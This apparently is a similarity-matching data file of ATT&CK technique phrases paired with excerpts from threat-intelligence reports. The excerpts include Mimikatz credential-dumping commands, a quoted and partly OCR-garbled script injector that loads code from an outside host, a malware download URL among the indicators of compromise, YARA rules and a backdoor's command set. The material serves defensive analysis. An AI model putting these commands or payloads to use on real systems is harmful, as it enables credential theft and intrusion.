phrase|similarity|adjacent_sentences
Dragonfly 2.0 has gathered hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems.|0.8013266223570882|['[15]EnterpriseT1190Exploit Public-Facing ApplicationDragonflyhas conducted SQL injection attacks, exploited vulnerabilities CVE-2019-19781 and CVE-2020-0688 for Citrix and MS Exchange, and CVE-2018-13379 for Fortinet VPNs.', '[8]EnterpriseT1203Exploitation for Client ExecutionDragonflyhas exploited CVE-2011-0611 in Adobe Flash Player to gain execution on a targeted system.', '[7]EnterpriseT1210Exploitation of Remote ServicesDragonflyhas exploited a Windows Netlogon vulnerability (CVE-2020-1472) to obtain access to Windows Active Directory servers.', '[8]EnterpriseT1133External Remote ServicesDragonflyhas used VPNs and Outlook Web Access (OWA) to maintain access to victim networks.', '[15][8]EnterpriseT1083File and Directory DiscoveryDragonflyhas used a batch script to gather folder and file names from victim hosts.', '[15][7][8]EnterpriseT1187Forced AuthenticationDragonflyhas gathered hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems.', '[15][7]EnterpriseT1591.002Gather Victim Org Information:Business RelationshipsDragonflyhas collected open source information to identify relationships between organizations for targeting purposes.', '[7]EnterpriseT1564.002Hide Artifacts:Hidden UsersDragonflyhas modified the Registry to hide created user accounts.', '[15]EnterpriseT1562.004Impair Defenses:Disable or Modify System FirewallDragonflyhas disabled host-based firewalls.', 'The group has also globally opened port 3389.', '[15]EnterpriseT1070.001Indicator Removal:Clear Windows Event LogsDragonflyhas cleared Windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs.']
While public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access.|0.8961421965517162|"['Exploit Public-Facing Application.', 'Accessed May 13, 2020 at: https://attack.mitre.org/techniques/T1190/ 3 MITRE.', '(May 31, 2017).', 'External Remote Services.', 'Accessed May 13, 2020 at: https://attack.mitre.org/techniques/T1133/ TLP: WHITE, ID#202006091030 10TTPs Hardware Additions 1 Adversaries may introduce computer accessories, computers, or networking hardware into a system or network that can be used as a vector to gain access.', 'While public references of usage by APT groups are scarce, many penetration testers leverage hardware additions for initial access.', 'Commercial and open source products are leveraged with capabilities such as passive network tapping, man-in-the middle encryption breaking, keystroke injection, kernel memory reading via DMA, adding new wireless access to an existing network, and others.', 'Replication Through Removable Media 2 Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes.', 'In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system.', ""In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself."", 'Spearphishing Attachment 3 Spearphishing attachment is a specific variant of spearphishing.']"
To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a hidden file.|0.8670669897926855|['Implementations include mimicking well-known protocols or developing custom protocols (including raw sockets) on top of fundamental protocols provided by TCP/IP/another standard network stack.', 'T1024 Custom Adversaries may use a custom cryptographic protocol or algorithm Cryptographic to hide command and control traffic.', 'A simple scheme, such as Protocol XOR-ing the plaintext with a fixed key, will produce a very weak ciphertext.', 'Copyright Leonardo S.p.a. All rights reserved 23 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 T1032 Standard Adversaries may explicitly employ a known encryption algorithm to Cryptographic conceal command and control traffic rather than relying on any Protocol inherent protections provided by a communication protocol.', 'Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.', 'T1158 Hidden Files To prevent normal users from accidentally changing special files on and Directories a system, most operating systems have the concept of a hidden file.', 'These files dont show up when a user browses the file system with a GUI or when using normal commands on the command line.', 'Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls a for Linux and macOS).', 'T1222 File and File and directory permissions are commonly managed by Directory discretionary access control lists (DACLs) specified by the file or Permissions directory owner.', 'File and directory DACL implementations may vary Modification by platform, but generally explicitly designate which users/groups can perform which actions (ex: read, write, execute, etc.).', 'Copyright Leonardo S.p.a. All rights reserved 24 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 7.']
Users must explicitly ask to show the hidden files either via a series of Graphical User Interface prompts or with command line switches .|0.8378414312329782|"['A simple scheme, such as Protocol XOR-ing the plaintext with a fixed key, will produce a very weak ciphertext.', 'Copyright Leonardo S.p.a. All rights reserved 23 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 T1032 Standard Adversaries may explicitly employ a known encryption algorithm to Cryptographic conceal command and control traffic rather than relying on any Protocol inherent protections provided by a communication protocol.', 'Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.', 'T1158 Hidden Files To prevent normal users from accidentally changing special files on and Directories a system, most operating systems have the concept of a hidden file.', 'These files dont show up when a user browses the file system with a GUI or when using normal commands on the command line.', 'Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls a for Linux and macOS).', 'T1222 File and File and directory permissions are commonly managed by Directory discretionary access control lists (DACLs) specified by the file or Permissions directory owner.', 'File and directory DACL implementations may vary Modification by platform, but generally explicitly designate which users/groups can perform which actions (ex: read, write, execute, etc.).', 'Copyright Leonardo S.p.a. All rights reserved 24 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 7.', 'INDICATORS OF COMPROMISE Hashes 1d5e4466a6c5723cd30caf8b1c3d33d1a3d4c94c25e2ebe186c02b8b41daf905 8dc3d053e5008ab92a17dc47fed43213a9873db0 0994d9deb50352e76b0322f48ee576c6 3e138e4e34c6eed3506efc7c805fce19af13bd62aeb35544f81f111e83b5d0d4 04686b0d2fdafa7cb6c17adc551abade334d7b85 14ecd5e6fc8e501037b54ca263896a11 8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667 7f043eb95d74d051ac780aee52ebf1c497c43060 19fbd8cbfb12482e8020a887d6427315 2dabb2c5c04da560a6b56dbaa565d1eab8189d1fa4a85557a22157877065ea08 4594453e2e4002101481dc44f203d3ffebe079ae edf900cebb70c6d1fcab0234062bfc28 5a204263cac112318cd162f1c372437abf7f2092902b05e943e8784869629dd8 09580f1deb096bb50d082bd169271d41756adf73 ea06b213d5924de65407e8931b1e4326 d49690ccb82ff9d42d3ee9d7da693fd7d302734562de088e9298413d56b86ed0 9d133d7e0616573a7d1c822cc878149e7aa7bad6 e079ec947d3d4dacb21e993b760a65dc 8ccc081d4940c5d8aa6b782c16ed82528c0885bbb08210a8d0a8c519c54215bc 0675329cfa4d13ee35f74c1cc236bc630b7de464 ad6731c123c4806f91e1327f35194722 67d9556c695ef6c51abf6fbab17acb3466e3149cf4d20cb64d6d34dc969b6502 f5a1a9180913bbeb1641af48660fbb756325f91e b4587870ecf51e8ef67d98bb83bc4be7 d9f2467ff11efae921ec83e074e4f8d2eac7881d76bff60a872a801bd45ce3d5 c67abb20ae5100f12ce084279827632fdbcb222a 7533ef5300263eec3a677b3f0636ae73 Copyright Leonardo S.p.a. All rights reserved 25 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 Yara Rules rule APT_MAL_LNX_Turla_Apr202004_1 { meta: description = ""Detects Turla Linux malware x64 x32"" date = ""2020-04-24"" hash1 = ""67d9556c695ef6c51abf6fbab17acb3466e3149cf4d20cb64d6d34dc969b6502"" hash2 = ""8ccc081d4940c5d8aa6b782c16ed82528c0885bbb08210a8d0a8c519c54215bc"" hash3 = ""8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667"" hash4 = ""1d5e4466a6c5723cd30caf8b1c3d33d1a3d4c94c25e2ebe186c02b8b41daf905"" hash5 = ""2dabb2c5c04da560a6b56dbaa565d1eab8189d1fa4a85557a22157877065ea08"" hash6 = ""3e138e4e34c6eed3506efc7c805fce19af13bd62aeb35544f81f111e83b5d0d4"" hash7 = ""5a204263cac112318cd162f1c372437abf7f2092902b05e943e8784869629dd8"" hash8 = ""8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667"" hash9 = ""d49690ccb82ff9d42d3ee9d7da693fd7d302734562de088e9298413d56b86ed0"" strings: $s1 = ""/root/.hsperfdata"" ascii fullword $s2 = ""Desc| Filename | size |state|"" ascii fullword $s3 = ""VS filesystem: %s"" ascii fullword $s4 = ""File already exist on remote filesystem !""', 'ascii fullword $s5 = ""/tmp/.sync.pid"" ascii fullword $s6 = ""rem_fd: ssl "" ascii fullword $s7 = ""TREX_PID=%u"" ascii fullword $s8 = ""/tmp/.xdfg"" ascii fullword $s9 = ""__we_are_happy__"" ascii fullword $s10 = ""/root/.sess"" ascii fullword $s11 = ""ZYSZLRTS^Z@@NM@@G_Y_FE"" ascii fullword condition: uint16(0) == 0x457f and filesize < 5000KB and 4 of them } Copyright Leonardo S.p.a. All rights reserved 26 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 rule APT_MAL_LNX_Turla_Apr202004_1_opcode { meta: description = ""Detects Turla Linux malware x64 x32"" date = ""2020-04-24"" hash1 = ""67d9556c695ef6c51abf6fbab17acb3466e3149cf4d20cb64d6d34dc969b6502"" hash2 = ""8ccc081d4940c5d8aa6b782c16ed82528c0885bbb08210a8d0a8c519c54215bc"" hash3 = ""8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667"" hash4 = ""1d5e4466a6c5723cd30caf8b1c3d33d1a3d4c94c25e2ebe186c02b8b41daf905"" hash5 = ""2dabb2c5c04da560a6b56dbaa565d1eab8189d1fa4a85557a22157877065ea08"" hash6 = ""3e138e4e34c6eed3506efc7c805fce19af13bd62aeb35544f81f111e83b5d0d4"" hash7 = ""5a204263cac112318cd162f1c372437abf7f2092902b05e943e8784869629dd8"" hash8 = ""8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667"" hash9 = ""d49690ccb82ff9d42d3ee9d7da693fd7d302734562de088e9298413d56b86ed0"" strings: $op0 = { 8D 41 05 32 06 48 FF C6 88 81 E0 80 69 00 } /* Xor string loop_p1 x32*/ $op1 = { 48 FF C1 48 83 F9 49 75 E9 } /* Xor string loop_p2 x32*/ $op2 = { C7 05 9B 7D 29 00 1D 00 00 00 C7 05 2D 7B 29 00 65 74 68 30 C6 05 2A 7B 29 00 00 E8 } /* Load eth0 interface*/ $op3 = { BF FF FF FF FF E8 96 9D 0A 00 90 90 90 90 90 90 90 90 90 90 89 F0} /* Opcode exceptions*/ $op4 = { 88 D3 80 C3 05 32 9A C1 D6 0C 08 88 9A 60 A1 0F 08 42 83 FA 08 76 E9 } /* Xor string loop x64*/ $op5 = { 8B 8D 50 DF FF FF B8 09 00 00 00 89 44 24 04 89 0C 24 E8 DD E5 02 00 } /* Kill call x32 */ $op6 = { 8D 5A 05 32 9A 60 26 0C 08 88 9A 20 F4 0E 08 42 83 FA 48 76 EB } /* Decrypt init str */ $op7 = { 8D 4A 05 32 8A 25 26 0C 08 88 8A 20 F4 0E 08 42 83 FA 08 76 EB} /* Decrypt init str */ condition: uint16(0) == 0x457f and filesize < 5000KB and 2 of them } Copyright Leonardo S.p.a. All rights reserved 27 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 REFERENCES [1] The Penquin Turla: A Turla/Snake/Uroburos Malware for Linux; by Kurt Baumgartner, Costin Raiu.']"
Attor can set attributes of log files and directories to HIDDEN, SYSTEM, ARCHIVE, or a combination of those.|0.7810014895083808|['ESET Research white papers TLP: WHITE AT COMMANDS, TOR-BASED COMMUNICATIONS: MEET ATTOR, A FANTASY CREATURE AND ALSO A SPY PLATFORM Author: Zuzana HromcovIn the fantasy book A Court of Thorns and Roses by Sarah J. Maas, Attor was an evil Faerie.', 'In that book, the Faeries ruled over all the known world and humans were their slaves.', 'In cybersecurity, Attor is a cyberespionage platform designed to exfiltrate valuable information from its victims.', 'Author: Zuzana Hromcov October 20191 AT commands, TOR-based communications: Meet Attor, a fantasy creature and also a spy platform TLP: WHITE CONTENTS 1 SUMMARY .', '.', '.', '.', '.', '.', '.']
InvisiMole has executed legitimate tools in hidden windows.|0.7533303627185787|['ESET Research white papers TLP: WHITE INVISIMOLE: THE HIDDEN PART OF THE STORY UNEARTHING INVISIMOLES ESPIONAGE TOOLSET AND STRATEGIC COOPERATIONS Authors: Zuzana Hromcov Anton CherepanovTLP: WHITE 2 InvisiMole: The hidden part of the story CONTENTS 1 EXECUTIVE SUMMARY  4 2 ATTACKS AND INVESTIGATION  4 2.1 InvisiMoles toolset .', '.', '.', '.', '.', '.', '.']
Adversaries may attempt to hide artifacts associated with their behaviors to evade detection.|0.7527455642990353|['Telsy SpA - TLP : WHITE 8 December 03, 2020...', 'Credits Telsy internal research team has been supported by the collaboration of several independent security researchers during the acquisition and analysis phases of parts of the artifacts and evidences collected.', 'Among these we thank Vito Alfano (@vxsh4d0w) for his precious support and collaboration.', 'Indicators of Compromise Type Value sha256 d9335a58ec7d9016258640393f0cedf4a574ae6bf9e262772ac0b21be1b3f160 sha256 25b747c5b79774e91f72f07b81819b9d1548d958247b81a72dca223cda2182b0 sha256 168cddae42f300dbf9a398a79ed28f7d18d35791b02f13b14509e4a8c23b5a9b sha256 907040c91f9b0dbe13ce4b1fc5b96774a578625a1b023684ef78d1c16b6e89ce sha256 2fb00f8374b1b111ed9061a709b35c8cbfa8ad60bf27669c5a1a77385af514c1 sha256 ba27b84be509f5707480a79966f02ee8a976baac8e68793a8ce9cf35ed9be0fd sha256 3943281b88b1c4d3afabc6f0db027b3933a0b3dcf22c13bd37103fa33d851d13 sha256 7dd928a1dbfb9e75e2c8832736810e328b2f6e8203dbf19c35edbcebb22a108a sha256 cbccebda97f3a276ac939e5e1502630e4cf981eb9c16dd80dddc3b6517d4d272 sha256 814c32d56b92bf4eca814173f27b46d0b9eb21cc76f356a17af01416f04bf691 sha256 9d0872926896a0efc6f5e2dc9ac2c7c62d1c29837b238daab47515fcc43a8e51 sha256 ab84cfaadbedc68ed1a9bcdd5b43cc1f64ce4a60e14d0a8b7eaada88dc99f896 sha256 fca6883b6508568056870e73b092d979af35f79b0665ff62c078909187c87eee sha256 02e069ca6d3d262d8e663981a1ace8aba1e44c1106e5c1f434b05e80f2eef19b sha256 26345084cbd7f3571599ead41cde209b46e5a9633b4b6d0e4c5ba379d3ffa4b8 sha256 cda07296d20a239bdb9cb5a2c9a814f69811bc85ced8bf32e998b906a413f416 sha256 15170d0dbe467efc4e38156ed4e03702ae19af44c100d7df7a75c6dbdb7ac587 sha256 2d31a07b636024d8dbf8fc1533c7af7ee9720886995c001ba9a701f3a90f007c sha256 7f7041f099dec8c842ac0225e505bbf51d0a4bf6f1440b5ec7b2d10ebd894d05 sha256 36a03ce4571347cee90c03067e2bae39ad80d597c8b40c430b37e4d6be96210e sha256 9e57f7e41d281935cc912f8d7066a6158071b1a79897455ce66cd17c5dd34f95 hostname mail.loanabank.com hostname mail.dledcardetails.pt hostname smtp.opw-global.com Telsy SpA - TLP : WHITE 9 December 03, 2020... hostname mail.bestelectricpanels.com domain cannabispropertybrokers.com domain colchoeslowcost.pt domain poptateseatery.com domain opw-global.com url https://cannabispropertybrokers.com/pop/8OwWKrFQ0gQoKt9.exe email biyou.packing@msa.hinet.net email smtp-2hn19@colchoeslowcost.pt email biyou.packing@msa.hinet.net email smtp-gxlj9@mchepuko.com email hackerteam@c21affiliated.com email wilson_yh@yeah.net email sebastian@amzcomplete.de email info@loanabank.com email wang@hfsr88.com email hugo@beanboom.cn email opwes.insidesales@opw-global.com email sean.barker@opw-global.com email cahya.lesmana@muarainternusa.com email davidloureiro@dledcardetails.pt email comunicaciones@samucongresos.es email administracion@bers.com.mx email info@almoosa-oam.com email dombotenisz@dombotenisz.hu email loureiro@dledcardetails.pt email corporate@hitechpeopleinc.com email careers@ghrc-bk.org email hayley@babygrowmemories.co.uk email info@makbes.com email jdean@itcmanagementsolutions.com email sales@globalelektrindo.com email marketing@nscmhmedicalcentre.com email fbwqv@aba-online.org.ar email info@fisicalmente.it email info@makbes.com Telsy SpA - TLP : WHITE 10 December 03, 2020... email anonymousfox-qxyb5@milanmandiri.com email info@berolahraga.com MITRE ATT&CK Technique Tactic Description T1566 Initial Access Threat actor uses phishing email with a malicious attachment to gain access to the internal network T1204 Execution Threat actor relies upon specific actions by a user in order to gain execution T1547 Persistence Threat actor configures system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems.', 'T1547 Privilege Escalation Threat actor configures system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems.', 'T1564 Defense Evasion Threat actor may attempt to hide artifacts associated with their behaviors to evade detection.', 'T1562.001 Defense Evasion Threat actor may disable security tools to avoid possible detection of their tools and activities.', 'Threat actor may use obfuscated files or T1140 Defense Evasion information to hide artifacts of an intrusion.', 'Adversaries may communicate using application layer protocols associated with web traffic to Command and Control T1071.001 avoid detection/network filtering by blending in with existing traffic.', 'Adversaries may communicate using application layer protocols associated with electronic mail T1071.003 Command and Control delivery to avoid detection/network filtering by blending in with existing traffic.', 'Telsy SpA - TLP : WHITE 11 December 03, 2020... T1132 Command and Control Command and control (C2) information is encoded using a standard data encoding system T1056.001 Collection Threat actor may log user keystrokes to intercept credentials as the user types them.']
Adversaries may attempt to hide artifacts associated with their behaviors to evade detection.|0.7789649486848762|"['Account Manipulation T1098 SVR cyber actors may manipulate accounts to maintain and/or elevate access to victim systems.', 'Table 6: SVR Cyber Actors ATT&CK Techniques for Enterprise: Defense Evasion Technique Title ID Use Obfuscated Files or Information: T1027.001 SVR cyber actors use BMPs to Binary Padding perform binary padding while exchange data is exfiltrated to an their C2 station.', 'Page 10 of 27 | Product ID: AA23-347A TLP:CLEARTLP:CLEAR International Partnership Masquerading T1036 SVR cyber actors use a variant that uses DLL hijacking in Zabbix as a means to start execution (and potentially provide long-term, hard-to- detect access) and a variant that masks itself within vcperf, an open- source C++ build analysis tool from Microsoft.', 'Process Injection T1055 SVR cyber actors inject code into AV and EDR processes to evade defenses.', 'Disable or Modify Tools T1562.001 SVR cyber actors may modify and/or disable tools to avoid possible detection of their malware/tools and activities.', 'Hide Artifacts T1564 SVR cyber actors may attempt to hide artifacts associated with their behaviors to evade detection.', 'Hide Artifacts: Hidden Files and T1564.001 When communicating with cloud Directories services, GraphicalProton generates a randomly named directory which is used to store infection-specific BMP files - with both commands and results.', 'Table 7: SVR Cyber actors ATT&CK Techniques for Enterprise: Credential Access Technique Title ID Use OS Credential Dumping: LSASS T1003.001 SVR cyber actors executed Mimikatz Memory commands in memory to gain access to credentials stored in memory.', 'OS Credential Dumping: Security T1003.002 SVR cyber actors used: Account Manager privilege::debug lsadump::cache lsadump::secrets lsadump::sam sekurlsa::logonpasswords Mimikatz commands to gain access to credentials.', 'Additionally, SVR cyber actors Page 11 of 27 | Product ID: AA23-347A TLP:CLEARTLP:CLEAR International Partnership exfiltrated Windows registry hives to steal credentials.', 'HKLM\\\SYSTEM HKLM\\\SAM HKLM\\\SECURITY Credentials from Password T1555.003 In a few specific cases, the SVR Stores: Credentials from Web used the SharpChromium tool to Browsers obtain sensitive browser data such as session cookies, browsing history, or saved logins.']"
Adversaries may attempt to hide artifacts associated with their behaviors to evade detection.|0.8855941549876555|"['Page 45 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may attempt to gather information on domain trust Domain Trust Discovery T1482 relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.', 'Adversaries may establish persistence and elevate privileges by Installer Packages T1546.016 using an installer to trigger the execution of malicious content.', 'Adversaries may execute their own malicious payloads by Dynamic Linker Hijacking T1547.006 hijacking environment variables the dynamic linker uses to load shared libraries.', 'Inter-Process Adversaries may abuse inter-process communication (IPC) T1559 Communication mechanisms for local code or command execution.', 'An adversary may compress and/or encrypt data that is collected Archive Collected Data T1560.003 prior to exfiltration.', 'Adversaries may attempt to hide artifacts associated with their Hide Artifacts T1564 behaviors to evade detection.', 'Adversaries may abuse the Windows service control manager to Service Execution T1569.002 execute malicious commands or payloads.', 'Adversaries may transfer tools or other files between systems in Lateral Tool Transfer T1570 a compromised environment.', 'Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid Protocol Tunneling T1572 detection/network filtering and/or enable access to otherwise unreachable systems.', 'Adversaries may employ a known encryption algorithm to conceal Encrypted Channel T1573 command and control traffic rather than relying on any inherent protections provided by a communication protocol.', 'Adversaries may employ a known symmetric encryption algorithm Symmetric Cryptography T1573.001 to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.']"
The group's JavaScript backdoor is also capable of downloading files.|1.0|"['[4]EnterpriseT1573.002Encrypted Channel:Asymmetric CryptographyCobalt Grouphas used the Plink utility to create SSH tunnels.', '[4]EnterpriseT1203Exploitation for Client ExecutionCobalt Grouphad exploited multiple vulnerabilities for execution, including Microsofts Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, CVE-2017-0199, and CVE-2017-8759.', '[1][2][3][5][6][7][10][12]EnterpriseT1068Exploitation for Privilege EscalationCobalt Grouphas used exploits to increase their levels of rights and privileges.', '[4]EnterpriseT1070.004Indicator Removal:File DeletionCobalt Groupdeleted the DLL dropper from the victims machine to cover their tracks.', '[1]EnterpriseT1105Ingress Tool TransferCobalt Grouphas used public sites such as github.com and sendspace.com to upload files and then download them to victim computers.', ""[2][3]The group's JavaScript backdoor is also capable of downloading files."", '[11]EnterpriseT1559.002Inter-Process Communication:Dynamic Data ExchangeCobalt Grouphas sent malicious Word OLE compound documents to victims.', '[1]EnterpriseT1046Network Service DiscoveryCobalt Groupleveraged an open-source tool called SoftPerfect Network Scanner to perform network scanning.', '[2][3][4]EnterpriseT1027.010Obfuscated Files or Information:Command ObfuscationCobalt Groupobfuscated several scriptlets and code used on the victims machine, including through use of XOR and RC4.', '[1][11]EnterpriseT1588.002Obtain Capabilities:ToolCobalt Grouphas obtained and used a variety of tools includingMimikatz,PsExec,Cobalt Strike, andSDelete.', '[3]EnterpriseT1566.001Phishing:Spearphishing AttachmentCobalt Grouphas sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations.']"
JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the Component Object Model and Internet Explorer HTML Application pages.|0.7672103347644436|"['If the browser version contains a vulnerability, corresponding exploitation code gets run on the target system, potentially giving the attacker a remote code execution ability.', 'For these types of attacks, adversaries often leverage JavaScript.', 'For instance, according to a malware analysis report performed by Palo Alto, analyzing threat samples from April 2022 to June 2022, among all of the web threats detected during the research, JavaScript downloaders and redirectors were in the top 5 most leveraged web threats, infecting around 300 different domains [31].', 'Analysis shows that attackers often inject malicious JavaScript downloaders to a webpage owned by them, creating several new script elements that redirect website visitors to ads, spams, or any other malicious domains such as train[.]developfirstline[.', ']com: .', '.', '.', 'Element.prototype.appendAfter = function(element) { element.parentNode.insertBefore(this, element.nextSibling) ), false(function () { var elem = document.createElement(\'script"") elem.type = \'text / javascript\' elem.sc = \'https://train.developfirstline.com/delivery.js?s=3\' elem.appendAfter(document.getElementsByTagName(\'script\')(0]) elem.appendAfter(document.getElementsByTagName(""\'head\')[0]) document.getElementsByTagName(\'head\')(01.appendChild(elem) .', '.', '.', '37#1.8.']"
Chaes has used JavaScript and Node.Js information stealer script that exfiltrates data using the node process.|0.8651104337526521|['In recent years, the LATAM cybercrime scene has evolved a great deal.', 'Some of the most notorious malware variants that have been prominent in the region over the last year include Grandoreiro, Ursa and Astaroth.', 'LATAM cybercrime activities demonstrate unique features when it comes to TTPs and how malware is propagated on an infected machine.', 'Some of the shared similarities include: Leveraging of .MSI files as an initial way to start the infection chain The use of Delphi as the preferred language to write malware Extensive use of LOLBins to execute content Downloading additional legitimate tools to expand the malwares capabilities and for obfuscation When observing the shared behavior and mindset of LATAM-based threat actors, Cybereason researchers observed that the malware authors emphasize the need to stay under the radar as much as possible, and prefer to use already-existing tools or legitimate software if it fits their needs.', 'FIGURE 1 Full Attack Infographic Chaes: Novel Malware Targeting Latin American E-Commerce 2Key Findings Targeting the Biggest E-Commerce Company in Latin America: Chaes specifically targets the Brazilian website of e-commerce company MercadoLivre and its payment page MercadoPago to steal its customers financial information.', 'The final payload of Chaes is a Node.Js information stealer that exfiltrates data using the node process.', 'Credential Stealing, Screen Capture, Browser Monitoring, Reconnaissance: Chaes is designed to steal sensitive information from the browser such as login credentials, credit card numbers, and other financial information from MercadoLivre website customers.', 'Chaes also takes screenshots of the infected machine, hooks and monitors the Chrome web browser to collect user information from infected hosts.', 'Multistage Delivery, Multi-Language Malware: Chaes delivery consists of several stages that include use of LoLbins and other legitimate software, making it very challenging to detect by traditional AV products.', 'Chaes also has multiple stages and is written in several programming languages including Javascript, Vbscript, .NET , Delphi and Node.js Downloads Legitimate Software, Designed for Stealth: Chaes operates using legitimate tools such as Python, Unrar and Node.js, and Chaes stages consist of several techniques such as use of LoLbins, open source tools, fileless parts and legitimate node.js libraries designed to increase the malwares stealthiness.', 'Under development: Cybereason observed new versions of Chaes, showing that the authors are improving the malware and adding more features FIGURE 1 Cybereason Anti-Malware Solution Detects and Prevents Chaes Chaes: Novel Malware Targeting Latin American E-Commerce 3Threat Analysis Phase One: Initial Access FIGURE 3 First stage of Deployment As with many traditional campaigns, this one begins by sending the victim a phishing email containing a .docx file.']
When it first starts, BADNEWS spawns a new thread to log keystrokes.|0.7820001682391653|"['Most commands are in the format of ""<cmd>:<encryped-parameter>"" where ""<cmd>"" is a plaintext command tag and ""<encrypted-parameter>"" is a parameter for the command encrypted with the algorithm previously described.', 'Listed below are supported command tags and their descriptions: CMD Description shell Download an EXE and inject it into a new process using process hollowing link Download an EXE and execute it via CreateProcess API mod Download a DLL from the URL specified and load it into the current process upd Download a new version of the malware and delete the old one via VBScript (see below) dwd Create an empty file in the %temp% folder and send to C&C - possibly used for identifying the local system time kl Send keylog file to C&C (keylogging is always on) snp Take a screenshot and send it to the C&C ustr Exfiltrate documents found on the machine - the malware asynchronously crawls local hard- drives for documents (pdf, doc etc.)', 'sdwl Upload specified file from victim machine utop Disable document exfiltration hcmd Execute command via cmd.exe and send the output to C&C {{ Use new C&C server address specified between {{ and }} in the content (i.e.', '{{MmVhZGFkMmQ2NGM2YzZjZGNkY2RlNjZmYWUwZjJlZTY0ZmNlOGVjNjZmYWUwZ jJlZTY4ZjJjOGYyMw==}}) ok Do nothing Figure 24 BADNEWS Command Set The malware will send back an acknowledgment response for most of these commands along with any additional data from the command that has been executed.', 'MONSOON ANALYSIS OF AN APT CAMPAIGN Revision: 1.07 | TLP-WHITE | 28/57Forcepoint Security Labs | Special Investigations Keylogger.', 'When BADNEWS first starts it will spawn a new thread to log keystrokes to a file.', 'The header of the file contains the marker ""KLTNM:"" and the system language.', 'The rest of the file contains information about the active window and the keys pressed: KLTNM: 000409 2016/06/01 09:42:18 - {Window Name} [SHIFT]c[SHIFT]; The malware will only send the keylog file to the C&C when instructed to by the ""kl"" command.', 'Document Crawler.', ""When BADNEWS first starts it will spawn a new thread to check all local & mapped drives for document files with the following extensions: doc docx pdf ppt pptx txt Any documents under 15MB will be copied to the user's %temp%\\\SMB\\\ folder."", 'The malware will only send these documents to the C&C when instructed to by the ""ustr"" command.']"
